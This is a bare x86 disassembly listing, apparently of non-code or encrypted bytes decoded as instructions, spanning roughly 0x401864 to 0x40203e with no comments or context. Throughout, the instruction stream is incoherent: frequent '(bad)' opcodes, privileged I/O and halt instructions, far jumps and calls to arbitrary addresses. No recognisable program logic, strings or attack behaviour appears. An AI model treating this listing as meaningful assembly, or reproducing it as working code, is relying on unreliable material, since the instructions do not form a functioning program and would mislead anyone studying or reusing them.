  401864:	add    DWORD PTR [eax+ebp*1+0x5f],ebp
  401868:	and    edx,DWORD PTR [esi]
  40186a:	aad    0xa7
  40186c:	loopne 0x40187b
  40186e:	retf   0x30a
  401871:	sub    bh,bl
  401873:	pop    edi
  401874:	xchg   dl,dh
  401876:	and    eax,0xd3c65c5
  40187b:	nop
  40187c:	cdq    
  40187d:	mov    cl,BYTE PTR [eax-0x7107e81a]
  401883:	jmp    0x401865
  401885:	pop    esi
  401886:	sbb    al,0x47
  401888:	sbb    al,0xf1
  40188a:	into   
  40188b:	addr16 aas 
  40188d:	out    dx,eax
  40188e:	add    eax,0xd9fa4fe7
  401893:	add    bh,dl
  401895:	sub    BYTE PTR [ecx-0x2],bh
  401898:	cmp    DWORD PTR [ecx+0x1f99c7c7],ebx
  40189e:	sar    DWORD PTR ds:0x5b926500,0xfb
  4018a5:	clc    
  4018a6:	dec    ebx
  4018a7:	adc    BYTE PTR ds:0x74eddc63,bl
  4018ad:	outs   dx,DWORD PTR ds:[esi]
  4018ae:	and    DWORD PTR [edx+0x6a],ecx
  4018b1:	enter  0x6823,0xa1
  4018b5:	ret    
  4018b6:	sbb    DWORD PTR [ebp-0x5c73c512],ecx
  4018bc:	sub    al,BYTE PTR [esi+0x539a5985]
  4018c2:	inc    esi
  4018c3:	pop    eax
  4018c4:	lahf   
  4018c5:	pop    ss
  4018c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018c7:	dec    edi
  4018c8:	ror    BYTE PTR [eax+edx*1+0x1d],0xdd
  4018cd:	sahf   
  4018ce:	gs icebp 
  4018d0:	rcl    DWORD PTR [edx-0x39],cl
  4018d3:	adc    eax,DWORD PTR [edi]
  4018d5:	test   al,0x16
  4018d7:	in     al,dx
  4018d8:	test   DWORD PTR ds:[ebp-0x68],esp
  4018dc:	lahf   
  4018dd:	xchg   ebp,eax
  4018de:	adc    cl,BYTE PTR [ecx+ebx*8-0x181b2522]
  4018e5:	fcom   QWORD PTR es:0x50c0210c
  4018ec:	xchg   DWORD PTR [ebx-0x3f],edx
  4018ef:	lds    edx,FWORD PTR [ebx]
  4018f1:	nop
  4018f2:	add    cl,0xdd
  4018f5:	and    DWORD PTR [edi+0x5],0xcc319cb6
  4018fc:	int3   
  4018fd:	addr16 mov dh,0x3f
  401900:	cli    
  401901:	xlat   BYTE PTR ds:[ebx]
  401902:	imul   esp,DWORD PTR [edi+0x979fa1d],0xfb282cdc
  40190c:	push   ecx
  40190d:	sbb    DWORD PTR [ecx-0x26],eax
  401910:	iret   
  401911:	push   esi
  401912:	mov    esi,0xa4bb6124
  401917:	loope  0x4018f3
  401919:	xchg   edi,eax
  40191a:	xor    DWORD PTR [edx+0x3e4625a1],0x6ae00a66
  401924:	mov    al,0x1c
  401926:	add    BYTE PTR [eax],ah
  401928:	test   bl,0x8d
  40192b:	inc    esp
  40192c:	sub    edx,esp
  40192e:	xor    cl,BYTE PTR [eax+0x5a]
  401931:	or     al,0xff
  401933:	pop    ebp
  401934:	inc    edi
  401935:	jecxz  0x4018ba
  401937:	xchg   esi,eax
  401938:	retf   
  401939:	int3   
  40193a:	(bad)  
  40193b:	cmp    eax,0x5c358ab5
  401940:	mov    ebp,0x58404ae6
  401945:	xor    DWORD PTR [ebx-0x22b099da],0xd7a07a69
  40194f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401950:	mov    ecx,0xac8aa2c0
  401955:	sahf   
  401956:	push   ebx
  401957:	adc    BYTE PTR [ebx+ecx*4-0x12],0x9f
  40195c:	aam    0xdb
  40195e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40195f:	out    0xc9,eax
  401961:	push   eax
  401962:	icebp  
  401963:	in     eax,0x9d
  401965:	mov    al,ds:0xb590da9a
  40196a:	mov    dl,0x5f
  40196c:	adc    DWORD PTR [ebp+0x7],ebp
  40196f:	div    BYTE PTR [edi+ebp*1]
  401972:	mov    ds:0x95c5699a,eax
  401977:	dec    edx
  401978:	loope  0x4019b5
  40197a:	retf   
  40197b:	sbb    al,0xfe
  40197d:	nop
  40197e:	pop    eax
  40197f:	neg    DWORD PTR [edi]
  401981:	xchg   edi,eax
  401982:	xchg   edx,eax
  401983:	shr    ch,1
  401985:	inc    ebp
  401986:	xchg   ebx,eax
  401987:	cmp    dl,bh
  401989:	jne    0x401971
  40198b:	xor    dh,BYTE PTR [esi+0x4f]
  40198e:	xchg   edi,eax
  40198f:	jl     0x40195c
  401991:	jmp    0xb8ad8f3a
  401996:	clc    
  401997:	sti    
  401998:	add    al,0x86
  40199a:	push   ebp
  40199b:	fisub  WORD PTR [edi]
  40199d:	cmp    eax,edx
  40199f:	push   ebx
  4019a0:	xchg   edi,eax
  4019a1:	nop
  4019a2:	retf   0x2b1a
  4019a5:	push   esp
  4019a6:	out    dx,al
  4019a7:	jnp    0x401a06
  4019a9:	xor    ebx,edi
  4019ab:	bound  ecx,QWORD PTR [eax+0x49a2314a]
  4019b1:	daa    
  4019b2:	lock aas 
  4019b4:	sbb    ch,BYTE PTR [edi]
  4019b6:	pop    edx
  4019b7:	mov    edx,0xd7f03f10
  4019bc:	push   0xffffff8c
  4019be:	leave  
  4019bf:	pop    ebp
  4019c0:	push   eax
  4019c1:	(bad)  
  4019c2:	jle    0x401977
  4019c4:	es hlt 
  4019c6:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4019c8:	sbb    BYTE PTR [edi+0x5e],ch
  4019cb:	push   ds
  4019cc:	mov    ds:0x9868b5b,eax
  4019d1:	std    
  4019d2:	js     0x4019d1
  4019d4:	into   
  4019d5:	aad    0x1c
  4019d7:	out    0x51,al
  4019d9:	lea    ebp,[ebx+0x996abca]
  4019df:	and    al,0x84
  4019e1:	fistp  WORD PTR ds:0x8f55385d
  4019e7:	int3   
  4019e8:	stos   DWORD PTR es:[edi],eax
  4019e9:	mov    ah,ah
  4019eb:	push   0x160f3aaa
  4019f0:	adc    eax,0x9af00535
  4019f5:	shl    BYTE PTR [edi-0x6a],0xc
  4019f9:	loop   0x401a53
  4019fb:	add    edi,esi
  4019fd:	retf   0x7c90
  401a00:	test   bl,ch
  401a02:	push   eax
  401a03:	test   BYTE PTR [ebx],ah
  401a05:	into   
  401a06:	repnz loopne 0x4019e9
  401a09:	mov    WORD PTR [edx],ds
  401a0b:	nop
  401a0c:	sbb    DWORD PTR ds:0xcb9cc4e4,edi
  401a12:	xchg   edx,eax
  401a13:	sbb    eax,0x9d86b702
  401a18:	pop    ecx
  401a19:	push   edx
  401a1a:	and    al,bh
  401a1c:	ins    BYTE PTR es:[edi],dx
  401a1d:	mov    al,0xf0
  401a20:	scas   eax,DWORD PTR es:[edi]
  401a21:	inc    edi
  401a22:	int    0x90
  401a24:	or     esp,0x56dc41c3
  401a2a:	push   ds
  401a2b:	jno    0x401a97
  401a2d:	push   DWORD PTR [ecx+0x2f59971a]
  401a33:	mov    cl,0xa8
  401a35:	dec    ebx
  401a36:	jne    0x401a35
  401a38:	mov    eax,0x6a0fdd8f
  401a3d:	or     BYTE PTR [edx+edi*4],dh
  401a40:	adc    eax,0x4b1c3f16
  401a45:	push   esp
  401a46:	ror    BYTE PTR [edi+0x1da2988f],1
  401a4c:	js     0x401ac6
  401a4e:	es sub al,0x41
  401a51:	mov    ch,0x6c
  401a53:	push   0xd8a58a99
  401a58:	in     al,dx
  401a59:	and    eax,0x9f7d3b70
  401a5e:	and    al,0xb9
  401a60:	xchg   edi,eax
  401a61:	fwait
  401a62:	in     eax,dx
  401a63:	cmp    al,0x8a
  401a65:	add    eax,0x54f2526b
  401a6a:	cmp    eax,edi
  401a6c:	sub    dh,cl
  401a6e:	push   0xe2192417
  401a73:	push   ecx
  401a74:	test   al,0x4b
  401a76:	(bad)  
  401a78:	pop    esp
  401a79:	pop    ds
  401a7a:	or     ah,BYTE PTR [edx-0x42]
  401a7d:	jae    0x401ac8
  401a7f:	xchg   esi,eax
  401a80:	mov    edi,0x702c4f81
  401a85:	(bad)  
  401a86:	sbb    ecx,ecx
  401a88:	stos   DWORD PTR es:[edi],eax
  401a89:	dec    edi
  401a8a:	retf   
  401a8b:	int3   
  401a8c:	mov    edi,0xfc9a3b2
  401a91:	push   esi
  401a92:	xchg   ecx,eax
  401a93:	and    dl,ah
  401a95:	ret    0x18d8
  401a98:	dec    edx
  401a99:	mov    eax,0x88a35c59
  401a9e:	je     0x401b14
  401aa0:	(bad)  
  401aa1:	and    DWORD PTR [ebp+0x1b],esp
  401aa4:	xor    ebx,ebx
  401aa6:	and    DWORD PTR ds:0xae854413,esp
  401aac:	nop
  401aad:	xchg   BYTE PTR [eax-0x31],dl
  401ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ab1:	into   
  401ab2:	clc    
  401ab3:	fisub  WORD PTR [esi-0x12932e42]
  401ab9:	sahf   
  401aba:	or     eax,0x72dd023c
  401abf:	fdivr  st,st(5)
  401ac1:	stos   DWORD PTR es:[edi],eax
  401ac2:	sbb    eax,0x2227e398
  401ac7:	pushf  
  401ac8:	test   eax,0x3d78f18d
  401acd:	retf   
  401ace:	pop    ebp
  401acf:	sbb    BYTE PTR [eax+ebp*1+0x27a1b221],ah
  401ad6:	pop    esp
  401ad7:	jns    0x401ab1
  401ad9:	sbb    eax,0x13432f2
  401ade:	sub    BYTE PTR [edi-0x3633625f],bl
  401ae4:	push   eax
  401ae5:	lods   al,BYTE PTR ds:[esi]
  401ae6:	mov    edx,0x810f9ad7
  401aeb:	imul   esi,DWORD PTR [ecx+0x3af11e88],0x6e62ffe2
  401af5:	and    BYTE PTR [edi-0x40],cl
  401af8:	inc    eax
  401af9:	sahf   
  401afa:	inc    esi
  401afb:	fdivr  st(5),st
  401afd:	mov    eax,edi
  401aff:	lods   eax,DWORD PTR ds:[esi]
  401b00:	mov    edi,0xa474f90
  401b05:	jmp    0x7ede:0xfc53760a
  401b0c:	mov    esi,DWORD PTR ds:0x57ddd564
  401b12:	fwait
  401b13:	lods   eax,DWORD PTR ds:[esi]
  401b14:	ret    0x98e5
  401b17:	sbb    eax,ebp
  401b19:	and    edx,DWORD PTR [eax+0x5e]
  401b1c:	jno    0x401ac6
  401b1e:	pop    edi
  401b1f:	aaa    
  401b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b21:	jb     0x401b4c
  401b23:	loope  0x401b72
  401b25:	xor    ebp,esp
  401b27:	dec    ebx
  401b28:	ret    
  401b29:	xchg   edx,eax
  401b2a:	dec    esp
  401b2b:	clc    
  401b2c:	loop   0x401abc
  401b2e:	ficomp WORD PTR [ebp+0x4c]
  401b31:	inc    DWORD PTR [edi-0x41]
  401b34:	mov    BYTE PTR [eax+0x78],ch
  401b37:	xchg   esp,eax
  401b38:	sti    
  401b39:	mov    bl,0xe2
  401b3b:	xchg   esp,eax
  401b3c:	in     eax,0xbc
  401b3e:	outs   dx,BYTE PTR ds:[esi]
  401b3f:	mov    es,WORD PTR [esi+0x3e]
  401b42:	jle    0x401afc
  401b44:	mov    esi,0xcc7a052a
  401b49:	int3   
  401b4a:	dec    ecx
  401b4b:	sti    
  401b4c:	and    DWORD PTR ds:[edi-0x40e4f678],0xffffff98
  401b54:	xchg   BYTE PTR [ecx+0x35f650ce],al
  401b5a:	mov    esp,0x102b6652
  401b5f:	fild   WORD PTR [edi-0x24]
  401b62:	pop    es
  401b63:	jo     0x401b82
  401b65:	jno    0x401b1e
  401b67:	nop
  401b68:	push   ds
  401b69:	dec    esp
  401b6a:	loopne 0x401b0d
  401b6c:	adc    DWORD PTR [ecx-0xe60f292],edi
  401b72:	es pop es
  401b74:	push   esi
  401b75:	and    dh,BYTE PTR [edi]
  401b77:	(bad)  
  401b78:	popa   
  401b79:	das    
  401b7a:	out    dx,al
  401b7b:	xchg   esi,eax
  401b7d:	xlat   BYTE PTR ds:[ebx]
  401b7e:	adc    ah,BYTE PTR [esi+0xbf08491]
  401b84:	mov    ebx,0x63118868
  401b89:	dec    edi
  401b8a:	pop    es
  401b8b:	mov    esi,0x92aef0fc
  401b90:	test   al,0xf7
  401b92:	rcl    DWORD PTR [edi+0x51],1
  401b95:	fld    DWORD PTR [ebx+edx*2+0x3a]
  401b99:	les    esp,FWORD PTR [edi-0x25]
  401b9c:	mov    edx,0x52a8be59
  401ba1:	jb     0x401bc5
  401ba3:	cmc    
  401ba4:	adc    eax,eax
  401ba6:	not    DWORD PTR [eax]
  401ba8:	mov    ds:0x96da7826,al
  401bad:	inc    edx
  401bae:	or     esi,DWORD PTR [edi+0x2658dd0e]
  401bb4:	adc    al,0xf2
  401bb6:	js     0x401c21
  401bb8:	xor    BYTE PTR [edx-0x5b],al
  401bbb:	dec    ebp
  401bbc:	mov    DWORD PTR [ebp+ecx*1-0x43071e2d],0x9e024f63
  401bc7:	shl    ah,1
  401bc9:	neg    BYTE PTR ds:0xe14778b
  401bcf:	clc    
  401bd0:	inc    ebx
  401bd1:	aam    0xd2
  401bd3:	jno    0x401b88
  401bd5:	out    0x7b,al
  401bd7:	xchg   ebp,eax
  401bd8:	jno    0x401bf5
  401bda:	ins    BYTE PTR es:[edi],dx
  401bdb:	jns    0x401bf2
  401bdd:	neg    BYTE PTR [ebx-0x59]
  401be0:	dec    ebp
  401be1:	stos   DWORD PTR es:[edi],eax
  401be2:	add    eax,0xb0bd31ce
  401be7:	mov    ecx,0xc073b28c
  401bec:	in     al,0xe5
  401bee:	mov    ds:0x68fd7b02,eax
  401bf3:	xchg   ebx,eax
  401bf4:	(bad)  
  401bf5:	mov    eax,ebp
  401bf7:	xor    eax,0x38d624d1
  401bfc:	inc    esp
  401bfd:	adc    dl,ah
  401bff:	mov    BYTE PTR [eax+eiz*1-0x61fb6791],ch
  401c06:	imul   ebp,DWORD PTR [ebx+ebp*8-0x5a],0xffffff9a
  401c0b:	sbb    al,0xfb
  401c0d:	mov    eax,ds:0xacd9a9f3
  401c12:	jb     0x401c60
  401c14:	jmp    0x401bdc
  401c16:	fadd   DWORD PTR [ecx+0x53]
  401c19:	adc    DWORD PTR [edx],ebx
  401c1b:	xor    al,0x44
  401c1d:	sbb    al,0xa8
  401c1f:	(bad)  
  401c20:	iret   
  401c21:	cwde   
  401c22:	mov    eax,0xff9f47e8
  401c27:	loope  0x401bd4
  401c29:	mov    BYTE PTR [edi-0x68],ch
  401c2c:	pop    eax
  401c2d:	push   cs
  401c2e:	mov    ch,0xda
  401c30:	seta   bh
  401c33:	lock retf 0x5fda
  401c37:	f2xm1  
  401c39:	into   
  401c3a:	xchg   ebp,eax
  401c3b:	test   BYTE PTR [ebp+0x4e7b1b09],ch
  401c41:	iret   
  401c42:	ins    DWORD PTR es:[edi],dx
  401c43:	xor    BYTE PTR [edx+0x75de52ab],ch
  401c49:	(bad)  
  401c4b:	adc    ebx,DWORD PTR [ebx+0x21494c9e]
  401c51:	jge    0x401bea
  401c53:	mov    bl,0xa9
  401c55:	sbb    DWORD PTR [ebx+0x551cda3b],esi
  401c5b:	fdiv   st(2),st
  401c5d:	fadd   QWORD PTR [di]
  401c60:	sub    BYTE PTR [eax],bh
  401c62:	in     al,dx
  401c63:	mov    ds:0x9e805cd2,eax
  401c68:	imul   esi,DWORD PTR [esi-0x1ff4c2bb],0xda63f62e
  401c72:	push   cs
  401c73:	jnp    0x401c86
  401c75:	fistp  DWORD PTR [ecx-0x4e]
  401c78:	sahf   
  401c79:	(bad)  
  401c7a:	shr    DWORD PTR [edx],cl
  401c7c:	cmp    al,BYTE PTR [edi]
  401c7e:	jnp    0x401cc4
  401c80:	jae    0x401c13
  401c82:	mov    ebp,0xf1916ddc
  401c87:	call   0x3db813ca
  401c8c:	push   0xffffffcf
  401c8e:	inc    edi
  401c8f:	and    DWORD PTR [edx+0x6f],ebx
  401c92:	pop    ds
  401c93:	int3   
  401c94:	xor    eax,ebp
  401c96:	inc    ebp
  401c97:	mov    ecx,ebx
  401c99:	(bad)  
  401c9a:	bound  edx,QWORD PTR [edx+0x16ea18df]
  401ca0:	mov    eax,DWORD PTR [eax+eax*1+0x755bd195]
  401ca7:	test   DWORD PTR [eax+0x1d436221],esp
  401cad:	mov    ebx,0xe5dd0c07
  401cb2:	mov    al,0x7e
  401cb4:	dec    edi
  401cb5:	adc    DWORD PTR [edi-0x5b],edi
  401cb8:	and    DWORD PTR [edx+0x76],ebx
  401cbb:	mov    esi,0x45fe0981
  401cc0:	icebp  
  401cc1:	mov    eax,0xc5b49c68
  401cc6:	mov    bh,0x53
  401cc8:	retf   0x3ad9
  401ccb:	push   ds
  401ccc:	fcom   DWORD PTR [edi+ebx*4-0x65]
  401cd0:	lahf   
  401cd1:	xor    eax,DWORD PTR [ebp+0x7988ea99]
  401cd7:	push   edi
  401cd8:	pop    esp
  401cd9:	(bad)  
  401cda:	fdivrp st(2),st
  401cdc:	sbb    BYTE PTR [esp+eiz*2+0x31e26396],bh
  401ce3:	(bad)  
  401ce4:	fidivr WORD PTR [ebx+0x17a9fe0d]
  401cea:	and    DWORD PTR [edi],ebx
  401cec:	lea    esi,[ebp-0x22745cd6]
  401cf2:	inc    ebp
  401cf3:	adc    DWORD PTR [esi+0x52],ebx
  401cf6:	sahf   
  401cf7:	xchg   edx,eax
  401cf8:	rol    BYTE PTR [ebp-0x67],0x57
  401cfc:	adc    eax,0xd0156d64
  401d01:	adc    eax,0xf6a84be
  401d06:	xor    DWORD PTR [eax-0xf08dec6],ebp
  401d0c:	add    eax,0x5c3d6c77
  401d11:	ret    
  401d12:	pusha  
  401d13:	sub    DWORD PTR [ecx],eax
  401d15:	(bad)  
  401d16:	cmc    
  401d17:	push   esi
  401d18:	adc    al,0x21
  401d1a:	in     eax,dx
  401d1b:	imul   esp,DWORD PTR [ebx+0x53ce078c],0xb375301b
  401d25:	jnp    0x401cfe
  401d27:	and    BYTE PTR [edx+0x2b522dde],dl
  401d2d:	outs   dx,DWORD PTR ds:[esi]
  401d2e:	jge    0x401d67
  401d30:	jno    0x401cff
  401d32:	icebp  
  401d33:	scas   eax,DWORD PTR es:[edi]
  401d34:	mov    al,dl
  401d36:	jg     0x401d49
  401d38:	xor    BYTE PTR [ecx-0x232efac2],bl
  401d3e:	bound  ebp,QWORD PTR [ebp+0x44]
  401d41:	cwde   
  401d42:	dec    ebx
  401d43:	ficom  DWORD PTR [esi+eax*8+0x570c6499]
  401d4a:	push   0x5d31d658
  401d4f:	gs (bad) 
  401d51:	jns    0x401d0a
  401d53:	sub    dh,BYTE PTR [esi]
  401d55:	(bad)  
  401d56:	add    BYTE PTR [eax],bl
  401d58:	mov    bl,0x1d
  401d5a:	out    0xfb,al
  401d5c:	pop    edx
  401d5d:	aad    0x3d
  401d5f:	jno    0x401dc8
  401d61:	not    BYTE PTR [eax]
  401d63:	(bad)  
  401d64:	int3   
  401d65:	mov    eax,esi
  401d67:	jne    0x401d6e
  401d69:	jns    0x401d3b
  401d6b:	fst    DWORD PTR [ecx]
  401d6d:	sbb    eax,0xe7e0a86b
  401d72:	nop
  401d73:	gs shl ah,0x9a
  401d77:	xor    BYTE PTR [edx-0x4b],cl
  401d7a:	cmp    eax,DWORD PTR [ebx]
  401d7c:	mov    dh,BYTE PTR [edx+ebp*1]
  401d7f:	ds jmp 0x31a3:0xeec36924
  401d87:	sub    BYTE PTR [esi-0x2980e827],0x23
  401d8e:	lock push ebx
  401d90:	cmp    dh,bl
  401d92:	shr    BYTE PTR [esi],1
  401d94:	push   esi
  401d95:	pop    ebx
  401d96:	je     0x401d37
  401d98:	push   0xaa9e8cbd
  401d9d:	jmp    0x8d3585f0
  401da2:	inc    ecx
  401da3:	test   DWORD PTR [eax],ebp
  401da5:	xor    ah,BYTE PTR [ebx-0x1f]
  401da8:	into   
  401da9:	push   esp
  401daa:	sahf   
  401dab:	sar    al,0xfd
  401dae:	adc    eax,0x747e88a5
  401db3:	and    DWORD PTR [edx+0x7d],ebp
  401db6:	leave  
  401db7:	retf   0x1817
  401dba:	loopne 0x401e3a
  401dbc:	(bad)  
  401dbd:	loope  0x401db7
  401dbf:	sub    eax,0xa4de5ddc
  401dc4:	mov    dh,0x1c
  401dc6:	dec    esi
  401dc7:	arpl   WORD PTR [edx+ebx*2+0xbdd4328],si
  401dce:	in     eax,0xbe
  401dd0:	(bad)  [eax-0x17b527be]
  401dd6:	pop    ecx
  401dd7:	test   eax,0xfb3769d4
  401ddc:	int    0xd6
  401dde:	fistp  QWORD PTR ds:0x913f8866
  401de4:	add    eax,0xd7f5dca9
  401de9:	jmp    0xca8c4e9e
  401dee:	lock dec eax
  401df0:	inc    ecx
  401df1:	or     DWORD PTR [ebp+esi*8-0x4],0x8c0ea4ff
  401df9:	push   ecx
  401dfa:	inc    esp
  401dfb:	pop    ss
  401dfc:	inc    ebx
  401dfd:	dec    esp
  401dfe:	or     ah,0x65
  401e01:	and    ebx,DWORD PTR fs:[edx+0x21f50239]
  401e08:	fild   WORD PTR [esi+0x2b3e7d]
  401e0e:	xor    ecx,DWORD PTR [eax+edx*4+0x44]
  401e12:	dec    esi
  401e13:	xchg   BYTE PTR [edx-0x42fe1fc6],dl
  401e19:	aam    0x81
  401e1b:	mov    edi,DWORD PTR [esi+eiz*8-0x9aee098]
  401e22:	lock in al,0xde
  401e25:	in     al,dx
  401e26:	inc    ebx
  401e27:	inc    esi
  401e28:	(bad)  
  401e29:	or     BYTE PTR [edx+edi*8],ah
  401e2c:	out    0x6d,al
  401e2e:	ins    BYTE PTR es:[edi],dx
  401e2f:	lds    esi,FWORD PTR [ecx-0x3b]
  401e32:	mov    al,0xcf
  401e34:	sbb    eax,0xc1c2861f
  401e39:	cmp    BYTE PTR [ebp+0x7f],bh
  401e3c:	xchg   ebp,eax
  401e3d:	fnstcw WORD PTR [ebx-0x54]
  401e40:	mov    bh,0xab
  401e42:	sub    ah,BYTE PTR [esi]
  401e44:	xor    dl,bh
  401e46:	ret    
  401e47:	push   ss
  401e48:	dec    edx
  401e49:	jbe    0x401e3d
  401e4b:	not    DWORD PTR [edi]
  401e4d:	repz pop esp
  401e4f:	ss aad 0xaf
  401e52:	push   edi
  401e53:	add    dl,BYTE PTR [edx]
  401e55:	jbe    0x401e66
  401e57:	pop    ds
  401e58:	mov    bh,0x70
  401e5a:	dec    ecx
  401e5b:	pusha  
  401e5c:	xchg   ecx,eax
  401e5d:	sub    al,BYTE PTR [ebx-0x5151f5fc]
  401e63:	out    0xbe,eax
  401e65:	mov    eax,ds:0xb389c42
  401e6a:	xchg   ebx,eax
  401e6b:	retf   0xe6cd
  401e6e:	stos   BYTE PTR es:[edi],al
  401e6f:	aad    0xc9
  401e71:	call   DWORD PTR [esi+ebp*1+0x7534b8e1]
  401e78:	aad    0xf1
  401e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e7b:	and    bl,BYTE PTR [ebx]
  401e7d:	pop    esp
  401e7e:	popa   
  401e7f:	jle    0x401e07
  401e81:	enter  0x9539,0xf0
  401e85:	add    edi,DWORD PTR [edx]
  401e87:	lods   eax,DWORD PTR ds:[esi]
  401e88:	call   0x9613:0xc0dd4466
  401e8f:	pop    esi
  401e90:	in     al,dx
  401e91:	es sub ah,bl
  401e94:	xor    DWORD PTR [edx-0x4c7fe8b3],edi
  401e9a:	nop
  401e9b:	ins    BYTE PTR es:[edi],dx
  401e9c:	mov    cs,WORD PTR [edi+0x2f]
  401e9f:	mov    esp,0x15f12c3c
  401ea4:	xor    ah,BYTE PTR ds:0xda199546
  401eaa:	xor    al,0xb1
  401eac:	mov    dh,0xb3
  401eae:	ins    BYTE PTR es:[edi],dx
  401eaf:	outs   dx,DWORD PTR ds:[esi]
  401eb0:	cdq    
  401eb1:	mov    cl,0x84
  401eb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401eb4:	popa   
  401eb5:	test   DWORD PTR [edi],edx
  401eb7:	ja     0x401f2a
  401eb9:	add    BYTE PTR [eax+0x380b4d25],ah
  401ebf:	inc    ebx
  401ec0:	and    eax,DWORD PTR [eax+0x6435e14f]
  401ec6:	fistp  DWORD PTR [ebp+0x5e]
  401ec9:	loop   0x401e84
  401ecb:	call   0xec70396e
  401ed0:	icebp  
  401ed1:	test   DWORD PTR [edx+0x57],0xd4321208
  401ed8:	add    DWORD PTR [ebx],eax
  401eda:	or     eax,0xfa6106e
  401edf:	jb     0x401e79
  401ee1:	pushf  
  401ee2:	push   edi
  401ee3:	je     0x401e9d
  401ee5:	inc    edi
  401ee6:	fistp  WORD PTR [ebx+0x49c0cb3]
  401eec:	lea    edx,[ecx+eiz*1+0x13]
  401ef0:	cli    
  401ef1:	inc    edx
  401ef2:	jae    0x401f69
  401ef4:	fs hlt 
  401ef6:	aaa    
  401ef7:	retf   
  401ef8:	sbb    al,0x6b
  401efa:	in     eax,dx
  401efb:	popa   
  401efc:	(bad)  
  401efd:	xchg   esi,eax
  401efe:	(bad)  
  401eff:	mov    ebp,0xdf77e4bf
  401f04:	add    eax,DWORD PTR [ecx-0x14]
  401f07:	cmp    ecx,edi
  401f09:	sahf   
  401f0a:	out    dx,eax
  401f0b:	jae    0x401f0b
  401f0d:	popf   
  401f0e:	(bad)  [eax+0xa]
  401f11:	inc    ecx
  401f12:	int3   
  401f13:	adc    edi,DWORD PTR [edx+ebp*2-0x40]
  401f17:	jo     0x401f56
  401f19:	sti    
  401f1a:	jp     0x401f57
  401f1c:	mov    ecx,0x5de3b51
  401f21:	mov    ecx,0xde6068f
  401f26:	mov    ecx,cs
  401f28:	(bad)  
  401f29:	clc    
  401f2a:	enter  0x1941,0x25
  401f2e:	stos   BYTE PTR es:[edi],al
  401f2f:	adc    al,0xce
  401f31:	mov    esp,0x3dab61fc
  401f36:	mov    eax,0x3be06d58
  401f3b:	shl    BYTE PTR [ebp-0x3],1
  401f3e:	mov    ah,0xcd
  401f40:	ins    BYTE PTR es:[edi],dx
  401f41:	xchg   esi,eax
  401f42:	imul   ebp,DWORD PTR [edx-0xdae8810],0x3c950d57
  401f4c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  401f4e:	rcr    BYTE PTR [esi-0x60],0xae
  401f52:	sub    DWORD PTR [edi],esi
  401f54:	push   es
  401f55:	push   ss
  401f56:	test   BYTE PTR [ebx+0x44b12a],al
  401f5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f5d:	(bad)  
  401f5e:	xor    BYTE PTR [edi-0x2d],bh
  401f61:	popf   
  401f62:	loope  0x401f08
  401f64:	jbe    0x401f83
  401f66:	xchg   BYTE PTR [ebx-0xc8f80ae],dl
  401f6c:	mov    eax,0xf6e151d8
  401f71:	inc    esi
  401f72:	add    esp,DWORD PTR [eax-0x15]
  401f75:	inc    edx
  401f76:	hlt    
  401f77:	push   ebp
  401f78:	ins    DWORD PTR es:[edi],dx
  401f79:	inc    ebp
  401f7a:	jmp    0x401f26
  401f7c:	call   0x8682:0x8f47f586
  401f83:	jbe    0x401fc0
  401f85:	icebp  
  401f86:	add    al,0x7a
  401f88:	shl    DWORD PTR [ebx+0x66],cl
  401f8b:	out    dx,eax
  401f8c:	adc    bl,BYTE PTR [esp+edi*2-0x3f]
  401f90:	repz (bad) 
  401f93:	fisubr DWORD PTR [ecx-0x71]
  401f96:	(bad)  [edi]
  401f98:	jl     0x401f8c
  401f9a:	push   0xffffffdc
  401f9c:	push   0x8d370d68
  401fa1:	jle    0x401f43
  401fa3:	sub    esp,DWORD PTR ds:0xec5ba1b3
  401fa9:	adc    al,0x74
  401fab:	scas   al,BYTE PTR es:[edi]
  401fac:	out    dx,al
  401fad:	dec    edi
  401fae:	sub    dl,BYTE PTR [esi+0x27]
  401fb1:	das    
  401fb2:	add    dh,BYTE PTR [bp+si]
  401fb5:	ret    
  401fb6:	xor    al,0x3
  401fb8:	mov    eax,0xa40f9fa8
  401fbd:	mov    BYTE PTR [edx-0x5e],dh
  401fc0:	fcomip st,st(2)
  401fc2:	adc    al,0x33
  401fc4:	add    ebp,esi
  401fc6:	out    dx,eax
  401fc7:	xor    bl,0x44
  401fca:	je     0x402047
  401fcc:	or     ebx,esp
  401fce:	push   edx
  401fcf:	outs   dx,BYTE PTR ds:[esi]
  401fd0:	shl    DWORD PTR [ecx*1+0x6420416e],0x84
  401fd8:	loope  0x401fe9
  401fda:	jb     0x401fd7
  401fdc:	sub    ecx,0xd8555cfe
  401fe2:	jge    0x402043
  401fe4:	shr    BYTE PTR ds:0x2681c375,1
  401fea:	xchg   edi,eax
  401feb:	loop   0x401fef
  401fed:	sub    eax,0x346736c4
  401ff2:	leave  
  401ff3:	mov    dl,0x60
  401ff5:	daa    
  401ff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ff7:	(bad)  
  401ff8:	xor    ah,ch
  401ffa:	jo     0x40202a
  401ffc:	sub    al,0xf1
  401ffe:	call   0x86ccc66f
  402003:	push   esi
  402004:	in     eax,dx
  402005:	mov    eax,ds:0x7abf3e54
  40200a:	je     0x402030
  40200c:	fnstcw WORD PTR [edx+esi*8]
  40200f:	(bad)  
  402010:	arpl   sp,cx
  402012:	in     eax,dx
  402013:	push   edi
  402014:	mov    esp,0x9852a769
  402019:	pop    esp
  40201a:	lahf   
  40201b:	dec    edi
  40201c:	loopne 0x401ffe
  40201e:	loope  0x401fa7
  402020:	mov    bl,0x2a
  402022:	popa   
  402023:	xor    eax,0xf52e4ddc
  402028:	loop   0x402015
  40202a:	mov    al,ds:0x54da072e
  40202f:	ds pop eax
  402031:	bound  ecx,QWORD PTR [esi+0x3b92572b]
  402037:	lods   al,BYTE PTR ds:[esi]
  402038:	xchg   esi,eax
  402039:	and    BYTE PTR [eax],ch
  40203b:	js     0x40209d
  40203d:	xchg   edx,eax
  40203e:	jmp    0xa3b09164
